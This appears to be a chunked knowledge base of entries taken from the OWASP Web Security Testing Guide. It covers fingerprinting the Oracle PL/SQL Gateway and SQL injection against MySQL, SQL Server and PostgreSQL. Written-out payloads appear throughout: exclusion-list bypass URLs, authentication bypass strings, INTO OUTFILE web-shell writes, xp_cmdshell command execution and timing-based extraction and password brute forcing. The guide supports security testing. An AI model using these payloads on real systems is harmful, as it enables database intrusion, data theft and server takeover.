{"id": "kb-001068", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Key steps in the PL/SQL request process include:\n1. Acceptance of web requests by the web server,\n2. Processing by the PL/SQL Gateway to extract package information,\n3. Execution of the procedure on the database server,\n4. Sending results back to the web server, which then responds to the original client request."}
{"id": "kb-001069", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Weaknesses in the PL/SQL Gateway or the PL/SQL application can lead to direct access to the database server, illustrating potential security risks irrespective of firewall protections."}
{"id": "kb-001070", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Common URL patterns for PL/SQL web applications include formats like:\n- http://www.example.com/pls/xyz\n- http://www.example.com/xyz/owa\n- http://www.example.com/xyz/plsql."}
{"id": "kb-001071", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Older versions of the PL/SQL Gateway use different URL structures. Detection of Oracle PL/SQL Gateway presence may be indicated by the absence of file extensions, suggesting a gateway interface."}
{"id": "kb-001072", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "A Database Access Descriptor (DAD) is crucial for the PL/SQL Gateway, containing connection details like TNS connect strings and user IDs. The user's schema can also prefix the requested package in the access URL; for instance: http://www.server.com/pls/xyz/webuser.pkg.proc."}
{"id": "kb-001073", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "DADs (Database Access Descriptors) are specified in the dads.conf Apache configuration file or the wdbsvr.app file in different versions of application servers."}
{"id": "kb-001074", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Default DAD examples include: SIMPLEDAD, HTMLDB, ORASSO, SSODAD, PORTAL, TEST, among others; these are used to define how web applications connect to databases."}
{"id": "kb-001075", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In a black box assessment scenario, it's crucial to determine the technology being assessed, specifically whether the server is running a PL/SQL application."}
{"id": "kb-001076", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Server response headers can indicate if the PL/SQL Gateway is active. Common response headers for Oracle applications include: 'Oracle-Application-Server-10g', 'Oracle-HTTP-Server Powered by Apache', and various version identifiers for Oracle servers."}
{"id": "kb-001077", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The NULL test in PL/SQL illustrates that a NULL expression is syntactically correct and does not produce errors when executed, confirming that null is an acceptable expression in PL/SQL."}
{"id": "kb-001078", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "To test if the server is running the PL/SQL Gateway, append 'NULL' and 'NOSUCHPROC' to the DAD URL, expecting a 200 OK for the first and a 404 Not Found for the second:\nhttp://www.example.com/pls/dad/null\nhttp://www.example.com/pls/dad/nosuchproc."}
{"id": "kb-001079", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The OWA_UTIL package includes a SIGNATURE procedure which outputs HTML stating when the page was produced: 'This page was produced by the PL/SQL Web Toolkit on date'. If a 403 Forbidden response is returned, it indicates the PL/SQL Gateway is operational."}
{"id": "kb-001080", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "It is possible to exploit vulnerabilities in PL/SQL packages in older versions of the PL/SQL Gateway that allow access to arbitrary PL/SQL packages in the database server, such as OWA_UTIL for running SQL queries:\nhttp://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT?P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS."}
{"id": "kb-001081", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Cross Site Scripting (XSS) attacks may be executed via the HTP package, for example:\nhttp://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>."}
{"id": "kb-001082", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Oracle introduced a PLSQL Exclusion list to curb access to dangerous procedures, banning requests starting with SYS.*, DBMS_*, HTP.*, or OWA*. However, vulnerabilities may still exist that allow bypassing this list."}
{"id": "kb-001083", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Exploitation can occur in packages within the CTXSYS and MDSYS schemas, still being susceptible even when others are banned. An example vulnerable call is:\nhttp://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL which returns a blank HTML page with a 200 OK response if the vulnerability is present (CVE-2006-0265)."}
{"id": "kb-001084", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "The Oracle PL/SQL Gateway has previously faced various flaws, including issues related to access to admin pages (CVE-2002-0561), buffer overflows (CVE-2002-0559), and directory traversal vulnerabilities, which can allow attackers to bypass the Exclusion List."}
{"id": "kb-001085", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Oracle's attempts to fix security flaws have often failed due to the introduction of new bypass techniques, highlighting the complexity of securing PL/SQL applications."}
{"id": "kb-001086", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Bypassing the Exclusion List can be achieved through various methods, which include using encoded characters like newline (%0A), space (%20), or tab (%09) before the schema/package name. A second method for bypassing utilizes labels (<<NAME>>) within PL/SQL, allowing attackers to reference portions of the code directly."}
{"id": "kb-001087", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The usage of double quotes around the schema/package name may also allow bypassing the exclusion list; this technique might not work with Oracle Application Server 10g due to case-sensitivity issues with requested literals."}
{"id": "kb-001088", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Character set translations can allow specific characters to bypass the exclusion list; for instance, the ÿ (0xFF) or Macron character (0xAF) may be converted to an upper case Y at the database server, which could lead to unauthorized access. The backslash (0x5C) character allows for another bypass capability under certain versions of the PL/SQL Gateway."}
{"id": "kb-001089", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The most complex bypass method involves crafting specific database calls directly in the request, as shown in the example with `declare ...` syntax, that allows for the execution of PL/SQL code remotely."}
{"id": "kb-001090", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The provided PL/SQL code is a security check mechanism that validates user input against a list of 'bad' strings, known as an exclusion list. If the input does not match any pattern in this list, the procedure is executed."}
{"id": "kb-001091", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "In the context of web security, line 19 checks user requests against this exclusion list to prevent malicious input from being executed. If the request includes a string that is not 'bad', processing continues, otherwise, it is flagged for potential security risks."}
{"id": "kb-001092", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The presence of a parameter (like XYZ) passed as a bind variable indicates a method aimed at preventing SQL injection attacks, as bind variables can help to separate data from commands in SQL queries, thus adding a layer of safety."}
{"id": "kb-001093", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "An example of an attempted SQL injection is presented, where an attacker injects a request via the URL. If the request does not trigger the exclusion list, it can lead to execution of undesirable commands."}
{"id": "kb-001094", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The mention of an error log entry (“PLS-00103: Encountered the symbol ‘POINT’ when expecting one of the following...”) illustrates how certain invalid injections can lead to errors, but also denotes a successful method where input could manipulate SQL behavior if not properly checked."}
{"id": "kb-001095", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "To exploit the system, an attacker must find implemented procedures that are not included in the exclusion list. Certain default PL/SQL packages, which have no parameters and do not match existing exclusions, can serve this purpose, suggesting a potential vulnerability. An attacker can leverage certain PL/SQL procedures available on a target system to perform SQL injection attacks."}
{"id": "kb-001096", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To test if a procedure is available, an attacker can use specific URLs designed to provoke responses. If the procedure returns a 200 OK response, it indicates that the method is valid and exploitable."}
{"id": "kb-001097", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of a URL test: http://server.example.com/pls/dad/orasso.home?FOO=BAR, where the expectation is that it returns a 404 error, but executes underlying PL/SQL due to parameter injection."}
{"id": "kb-001098", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The syntax used in attacking the procedure involves closing brackets and using comment syntax (--) to manipulate the execution context of the SQL being run."}
{"id": "kb-001099", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An attacker can control the bind variables via crafted queries, allowing them to execute arbitrary SQL commands, such as using HTP.PRINT to output values or accessing database information."}
{"id": "kb-001100", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of how to print a value using a bind variable: http://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR, which returns 'BAR' in the HTML response by utilizing the injected query parameter."}
{"id": "kb-001101", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Using the technique of injecting 'execute immediate :1;', an attacker can run arbitrary SQL statements, which could include unsafe operations leading to complete control over the database. An example URL for executing SQL is: http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual."}
{"id": "kb-001102", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL injection flaws can be exploited in custom PL/SQL applications, especially during black box security assessments where the code is unavailable for review."}
{"id": "kb-001103", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Testing for SQL injection involves checking input parameters for vulnerabilities by embedding a single quote into the parameter and looking for error responses. A response indicating an error or '404 Not Found' suggests a potential SQL injection issue."}
{"id": "kb-001104", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "An example provided involves a PL/SQL web application where a user can search for books by author. If a request with a single quote in the parameter yields an error, it indicates a SQL injection vulnerability."}
{"id": "kb-001105", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "To confirm the SQL injection vulnerability, the concatenation operator can be used in the input parameter. For example, if the request with concatenation returns valid results, it confirms a vulnerability."}
{"id": "kb-001106", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Tools such as Orascan (Oracle Web Application VA scanner) and NGS SQuirreL (Oracle RDBMS VA Scanner) are mentioned for assessing security in PL/SQL applications."}
{"id": "kb-001107", "section": null, "tags": ["AUTHZ", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL Injection vulnerabilities occur when input is used in SQL queries without proper constraints or sanitization. This can allow attackers to execute SQL code under the privileges of the database connection user. MySQL has particularities that require customized exploits for this database management system (DBMS). Different versions of MySQL (3.23.x, 4.0.x, 4.1.x, 5.0.x) have different features affecting SQL injection techniques: - Version 4.0 introduced UNION statements. - Version 4.1 introduced subqueries. - Version 5.0 introduced stored procedures, stored functions, and the view named INFORMATION_SCHEMA. - Version 5.0.2 added triggers to the feature set."}
{"id": "kb-001108", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Before SQL injection attacks can be performed, one must consider how strings are represented, particularly how single quotes are escaped in MySQL."}
{"id": "kb-001109", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The escaping of single quotes in MySQL is done using backslashes: MySQL interprets escaped apostrophes (\\') as characters, not metacharacters."}
{"id": "kb-001110", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Two scenarios must be considered for escaped single quotes in web applications: (1) the application escapes single quotes (\\') and (2) the application does not escape single quotes ('). In MySQL, there is a standard way to bypass the need for single quotes for constant strings, allowing direct manipulation of the SQL query."}
{"id": "kb-001111", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "In MySQL, there are specific ways to format password strings for SQL injection attacks, such as using patterns like 'A%', concatenated hex values like 0x4125, and the `CHAR()` function such as `CHAR(65,37)` that represent ASCII characters."}
{"id": "kb-001112", "section": null, "tags": ["API", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Multiple queries in MySQL cannot be separated by semicolons (;) like in other databases (e.g., Microsoft SQL Server), which restricts the ability to execute multiple non-homogeneous SQL commands in a single SQL injection attack."}
{"id": "kb-001113", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To identify the presence of a MySQL database management system (DBMS), one can utilize the comment block feature that allows MySQL to interpret certain commands while appearing as comments to other DBMS."}
{"id": "kb-001114", "section": null, "tags": ["INFO"], "source": "wstg-v4.2.pdf", "text": "Version information of the MySQL database can be obtained through three methods: accessing the global variable `@@version`, using the `VERSION()` function, and through comment fingerprinting techniques such as `/*!40110 and 1=0*/` which checks for specific version numbers."}
{"id": "kb-001115", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "In-band injection can reveal version information using a query structured like `1 AND 1=0 UNION SELECT @@version /*`, while inferential injection can use `1 AND @@version like '4.0%'` to extract the version from the response."}
{"id": "kb-001116", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Understanding user roles in MySQL Server is critical since there are different types of users that the MySQL server recognizes, impacting access and security."}
{"id": "kb-001117", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "USER(): refers to the user connected to the MySQL Server, while CURRENT_USER() refers to the internal user executing the query, which could be anonymous or have an empty name ('')."}
{"id": "kb-001118", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Stored procedures or functions execute with the privileges of the creator user unless declared otherwise, which can be confirmed by using CURRENT_USER()."}
{"id": "kb-001119", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "In band injection SQL examples include '1 AND 1=0 UNION SELECT USER()' to obtain the username and '1 AND 1=0 UNION SELECT DATABASE()' to find the current database name."}
{"id": "kb-001120", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Inferential injection examples are '1 AND USER() like 'root%'' and '1 AND DATABASE() like 'db%'' which demonstrate how to exploit user and database information through timing or result-based SQL injection."}
{"id": "kb-001121", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "INFORMATION_SCHEMA is a MySQL view created from version 5.0, allowing the retrieval of metadata about databases, tables, columns, and procedures."}
{"id": "kb-001122", "section": null, "tags": ["AUTHZ", "SQLI"], "source": "wstg-v4.2.pdf", "text": "The INFORMATION_SCHEMA contains various tables such as SCHEMATA (listing all databases accessible to the user with SELECT privilege), TABLES (listing all tables), and COLUMNS (listing all columns), among others."}
{"id": "kb-001123", "section": null, "tags": ["AUTHZ", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Each of these tables provides information on user privileges at different granularities, such as SCHEMA_PRIVILEGES for database privileges, TABLE_PRIVILEGES for table-level privileges, and COLUMN_PRIVILEGES for column-level privileges. Attack Vectors: - Write in a File: If the user has FILE privileges and single quotes are not escaped, the SQL 'into outfile' clause can be used to export query results into a file. Example: 'SELECT * FROM table INTO OUTFILE '/tmp/file'' directly exports the results to the specified file location. - Note on Security: If there's a sanitization of single quotes (such as escaping them), the 'into outfile' clause cannot be used. - Example of File Creation: 'SELECT 1 LIMIT 1 INTO OUTFILE '/var/www/root/test.jsp' FIELDS ENCLOSED BY '//' LINES TERMINATED BY '\\n<%jsp code here%>';' would create a file with JSP code accessible from a web server if permissions allow. - File Permissions: The created file is owned by the MySQL user and group, and it has rw-rw-rw permissions (readable and writable by all). - Read from a File: The 'load_file' function can read file content if the connected user has FILE privileges. It can be invoked as 'load_file('filename')' to read file contents, controlled by file system permissions."}
{"id": "kb-001124", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Standard SQL Injection: A standard SQL injection can result in data displayed directly on a page or as a MySQL error. Depending on the MySQL version, direct SQL injections can be accomplished using standard techniques, where errors thrown by the server can provide useful information. Consulting the MySQL Manual reveals specific errors related to native functions and procedures. Out of Band SQL Injection: This type of SQL injection can be achieved by utilizing the 'into outfile' clause."}
{"id": "kb-001125", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Blind SQL Injection: This is a specific type of SQL injection where certain functions provided by MySQL can be used to extract information, such as: - String Length: 'LENGTH(str)' method retrieves the length of a string. - Substring Extraction: 'SUBSTRING(string, offset, #chars_returned)' method allows extraction of a segment of a string."}
{"id": "kb-001126", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The BENCHMARK function in SQL can be used to perform timing attacks, particularly effective in scenarios of blind SQL injection where traditional boolean value injections do not work."}
{"id": "kb-001127", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The SLEEP() function (available in MySQL versions greater than 5.0.x) serves as an alternative method to BENCHMARK for conducting timing-based attacks."}
{"id": "kb-001128", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "A selection of SQL injection tools includes: 1. Francois Larouche's Multiple DBMS SQL Injection tool, 2. sqlbftools from Reversing.org, 3. sqlmap by Bernardo Damele A. G., an automated SQL injection tool, and 4. MySqloit, a MySQL Injection takeover tool created by Muhaimin Dzulfakar."}
{"id": "kb-001129", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Referencing relevant whitepapers, such as Chris Anley's 'Hackproofing MySQL', can provide further insights into securing MySQL databases against SQL injection vulnerabilities."}
{"id": "kb-001130", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Case studies like Zeelock's Blind Injection in MySQL Databases illustrate practical examples and implications of SQL injection attacks in real-world environments. SQL injection vulnerabilities arise when input is incorporated into SQL queries without proper constraints or sanitization. Dynamic SQL, which is constructed by concatenating strings, is particularly susceptible to SQL injection attacks."}
{"id": "kb-001131", "section": null, "tags": ["AUTHZ", "SQLI"], "source": "wstg-v4.2.pdf", "text": "An attacker exploiting SQL injection can execute SQL code with the privileges of the connected user, potentially leading to unauthorized access and data manipulation."}
{"id": "kb-001132", "section": null, "tags": ["SESSION", "SQLI"], "source": "wstg-v4.2.pdf", "text": "For any user-controlled parameter processed by the application (such as those in query strings, POST request bodies, or session information), there is a potential vulnerability to SQL injection."}
{"id": "kb-001133", "section": null, "tags": ["API", "AUTHZ", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Specific characteristics of Microsoft SQL Server necessitate customized SQL injection techniques, considering its unique commands and procedures. Key operators and commands for SQL injection testing in SQL Server include: - Comment operator: `--`, which can force the query to ignore the remaining part of the original query. - Query separator: `;`, which can be used to separate commands. Useful stored procedures for SQL Injection testing include: 1. `xp_cmdshell`: Executes shell commands with the same permissions as the SQL Server process, typically restricted to sysadmin by default. 2. `xp_regread`: Reads values from the registry, an undocumented procedure. 3. `xp_regwrite`: Writes values into the registry, an undocumented procedure. 4. `sp_makewebtask`: Executes a command from a Windows command shell and returns output as text rows, requiring sysadmin privileges. 5. `xp_sendmail`: Sends an email, potentially including query results as attachments, using SQL Mail."}
{"id": "kb-001134", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An example attack could involve using `xp_cmdshell` to execute a command that lists directory contents and writes them to a file, demonstrating the risk of file access and command execution."}
{"id": "kb-001135", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "sp_makewebtask is a deprecated function in SQL Server that allows a user to create a web task, potentially exposing vulnerabilities if successfully executed. It is represented as: exec sp_makewebtask 'C:\\Inetpub\\wwwroot\\test.txt', 'select * from master.dbo.sysobjects'--"}
{"id": "kb-001136", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Using db_name() in a SQL Injection attack can reveal the name of the current database by forcing an error. This is done through a URL such as: /controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name()) which triggers an error that displays the database name if the application reveals it."}
{"id": "kb-001137", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The CONVERT function in SQL Server can be used to force a type conversion that results in an error, allowing for information retrieval during SQL Injection. The syntax is: CONVERT(data_type [ ( length ) ], expression [ , style ])"}
{"id": "kb-001138", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The @@version environment variable can be exploited through SQL Injection to gather version information about the SQL Server. An example is: /form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--."}
{"id": "kb-001139", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Example of testing for SQL Injection in a GET Request involves manipulating login credentials with: https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1, which can lead to unauthorized access if the application uses Dynamic SQL."}
{"id": "kb-001140", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Testing column counts in SQL Injection can be done via a modified URL like: https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--, allowing attackers to understand the database structure."}
{"id": "kb-001141", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "Testing in a POST Request for SQL Injection can be performed with parameters such as email and submission values, as illustrated: POST /forgotpass.asp HTTP/1.1 Host: vulnerable.web.app."}
{"id": "kb-001142", "section": null, "tags": ["AUTHN", "HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "The text provides an example of web security testing related to SQL injection vulnerabilities, particularly in regards to the handling of user input for a login application. The user input includes a single quote, which leads to a specific SQL error related to unclosed quotation marks, highlighting improper input validation in web applications."}
{"id": "kb-001143", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The example demonstrates a method to exploit SQL Server by using the stored procedure 'xp_cmdshell' to execute command shell commands at the server level. This poses significant security risks if not properly managed."}
{"id": "kb-001144", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In SQL Server 2000, best practices recommend disabling 'xp_cmdshell' to prevent unauthorized command execution. If it is disabled, attackers can potentially bypass this limitation using specific SQL commands to redefine 'xp_cmdshell.'"}
{"id": "kb-001145", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "The code snippet for re-enabling 'xp_cmdshell' in SQL Server 2005 shows how to use 'sp_configure' to change server settings, indicating that knowledge of SQL Server configurations is critical for security testing."}
{"id": "kb-001146", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The REFERER header can be exploited to execute arbitrary SQL code by injecting payloads, which highlights the importance of sanitizing inputs and validating headers in web security."}
{"id": "kb-001147", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "SQL Server's OPENROWSET command can function as a port scanner by attempting to connect to other machines, returning specific error messages based on whether ports are open or closed. This method can be used by penetration testers to gauge network accessibility."}
{"id": "kb-001148", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In SQL Server 2000, OPENROWSET is enabled by default, while it is disabled in SQL Server 2005, which can affect the ability to use it for port scanning. This indicates a shift in security best practices between these versions of SQL Server."}
{"id": "kb-001149", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Using xp_cmdshell allows attackers to execute operating system commands directly from SQL Server, which can enable the upload of executables such as netcat for further exploitation."}
{"id": "kb-001150", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The example provided demonstrates a method of creating an FTP script through SQL commands to upload executables, which reflects a vulnerability in handling untrusted data in SQL Server."}
{"id": "kb-001151", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "If FTP is blocked by firewalls, attackers can use Windows's debug.exe to create executables from ASCII scripts, indicating that even restricted environments can still be exploited by knowledgeable attackers. This underscores the importance of securing execution environments on servers."}
{"id": "kb-001152", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "The execution of commands via `xp_cmdshell` can facilitate the creation of a debug script on a target machine, allowing an attacker to execute arbitrary code once the executable is available. For example, `exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--` demonstrates how commands can be concatenated to form a complete executable script. Automation tools such as Bobcat for Windows and Sqlninja for Unix can streamline the process of SQL injection exploitation."}
{"id": "kb-001153", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Blind SQL Injection is a method of exploiting web applications where the application does not return explicit error messages. Penetration testers can still simulate such attacks offline if they have access to source code, allowing them to understand and exploit vulnerabilities even without direct feedback from the application."}
{"id": "kb-001154", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "To trial and error determine SQL injection vulnerabilities, an attacker might use specific input such as `'Bomba' OR 1=1-`, which aims to manipulate queries by exploiting improper data validation."}
{"id": "kb-001155", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Descriptive error messages can be informative; for instance, a 500 Internal Server Error or custom developer error messages such as 'bad data' can provide insights into the web application's query structure and weaknesses."}
{"id": "kb-001156", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "Timing attacks provide another method for conducting blind SQL injections. By measuring the response time of the application to particular queries (for example, using the command `waitfor delay '0:0:5'`), an attacker can infer the existence of a SQL injection vulnerability based on the application’s response delay. SQL injection vulnerability allows a penetration tester to extract data from a database by measuring query response time."}
{"id": "kb-001157", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A covert channel can enable information retrieval, providing 1 bit of data per query by manipulating response times based on the information being queried."}
{"id": "kb-001158", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The provided example uses SQL commands to deduce the length of the current database name by comparing it to a value using a delay technique."}
{"id": "kb-001159", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The query `if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'` waits for 5 seconds if a specific bit in a byte is set, allowing the tester to retrieve each byte of information iteratively."}
{"id": "kb-001160", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "If the `waitfor` command is filtered by security measures, alternate time-consuming operations can still facilitate a blind SQL injection attack."}
{"id": "kb-001161", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Understanding the SQL Server version using a similar timing attack on the system variable `@@version` is possible by determining specific characters in the response string."}
{"id": "kb-001162", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The example demonstrates bruteforcing the sysadmin password using the `OPENROWSET` command, which requires proper credentials to execute correctly, and can be utilized in an inferenced injection attack."}
{"id": "kb-001163", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "Attempting a database connection using SQL Server can exploit vulnerabilities through incorrect password guesses. The process involves attempting to connect to a local database using provided credentials, where the credential structure is typically 'sa' (system administrator) and a password placeholder (<pwd>)."}
{"id": "kb-001164", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "A successful connection triggers a query that makes the database wait for a specified time (5 seconds in this case). This delay can be measured to guess the correct password, allowing for a brute-force password attack technique utilizing timing attacks."}
{"id": "kb-001165", "section": null, "tags": ["AUTHN", "SQLI"], "source": "wstg-v4.2.pdf", "text": "David Litchfield's technique in 'Data-mining with SQL Injection and Inference' takes this further by injecting SQL code that leverages the CPU resources of the database server to brute-force the sysadmin password."}
{"id": "kb-001166", "section": null, "tags": ["AUTHN", "AUTHZ"], "source": "wstg-v4.2.pdf", "text": "If the sysadmin password is acquired, two paths can be pursued: executing commands with sysadmin privileges through OPENROWSET or adding the current user to the sysadmin group using the stored procedure sp_addsrvrolemember."}
{"id": "kb-001167", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "It is important to note that while OPENROWSET is available to all users on SQL Server 2000, it requires administrative privileges on SQL Server 2005, indicating a level of security improvement in the latter version."}
{"id": "kb-001168", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "SQL Injection techniques specific to PostgreSQL include various characteristics such as the ability to execute multiple statements using ';' as a separator and the ability to truncate SQL statements with the comment character '--'. The LIMIT and OFFSET clauses can be utilized in SELECT statements to manipulate the size of the result set from a query."}
{"id": "kb-001169", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "To determine if a target database is PostgreSQL during an SQL injection attack, you can use the :: cast operator, demonstrated with the example: http://www.example.com/store.php?id=1 AND 1::int=1."}
{"id": "kb-001170", "section": null, "tags": ["HTTP", "SQLI"], "source": "wstg-v4.2.pdf", "text": "The function version() is useful for obtaining the PostgreSQL banner, which reveals the server version and the type of operating system. An example request is: http://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--. A potential response might be: 'PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)'."}
{"id": "kb-001171", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "For blind SQL injection attacks, functions such as LENGTH(str) to get string length, SUBSTR(str,index,offset) to extract substrings, and CHR() for creating strings without single quotes can be used."}
{"id": "kb-001172", "section": null, "tags": ["SQLI"], "source": "wstg-v4.2.pdf", "text": "PostgreSQL 8.2 introduced pg_sleep(n), a function to pause execution for a specified number of seconds, which can facilitate timing attacks in blind SQL injection scenarios."}
